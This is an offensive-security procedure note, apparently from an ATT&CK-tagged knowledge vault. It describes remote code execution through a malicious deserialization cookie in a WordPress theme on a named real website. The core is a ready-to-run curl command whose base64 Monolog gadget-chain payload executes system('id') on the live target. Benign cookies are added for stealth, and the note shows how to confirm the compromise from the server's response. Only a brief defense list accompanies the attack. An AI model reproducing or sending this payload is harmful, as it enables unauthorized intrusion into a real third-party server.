---
tags:
  - rce
  - http-request
  - cookie-injection
  - curl
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-exploit-deserialization-rce]]'
  - '[[commands/system-id-execution]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8ecf89ba-2889-4f86-81de-17f8b72c7562
created_at: '2025-12-14T17:23:54.975Z'
updated_at: '2025-12-14T17:23:54.975Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger RCE by Sending Malicious Cookie in HTTP Request

## Summary

This procedure sends an HTTP GET request to the vulnerable newsletter endpoint with a malicious base64-encoded cookie payload, triggering deserialization and remote code execution via the Monolog gadget chain.

## Description

In the context of the Nextcloud WordPress theme vulnerability, this procedure exploits the unserialize call in ninjaforms.php by injecting the crafted payload into the 'nc_form_fields' cookie. The request mimics legitimate traffic with additional benign cookies. Expected outcomes: Execution of arbitrary commands on the server as www-data, confirmed by output in the HTTP response.

## Requirements

1. Crafted payload from prior procedure
2. Network access to the target URL (https://nextcloud.com/newsletter/)
3. curl tool installed

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all cookie inputs before deserialization
- Use HTTP-only and secure flags on sensitive cookies
- Log and monitor HTTP requests for large or anomalous cookie values; employ SIEM for RCE indicators like unexpected command outputs

## Objectives

1. Deliver the payload to trigger deserialization
2. Execute proof-of-concept command ('id')
3. Confirm server compromise

## Instructions

### Step 1: Prepare the Malicious Request

**Context**: Set up cookies including the malicious 'nc_form_fields' alongside benign ones for stealth.

Use [[commands/curl-exploit-deserialization-rce]]:

```bash
curl -i -s -k -X $'GET' -H $'Host: nextcloud.com' -b $'nc_cookie_banner={"essentials":true,"convenience":false,"statistics":{"matomo":false},"external_media":{"youtube":false,"vimeo":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' $'https://nextcloud.com/newsletter/'
```

> This sends a GET to /newsletter/ with the payload, triggering [[commands/system-id-execution]].

### Step 2: Analyze Response for RCE Confirmation

**Context**: Check the HTTP response for command output indicating successful execution.

No additional command.

> Look for 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' in the body, confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-exploit-deserialization-rce]]
- [[commands/system-id-execution]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- http-request
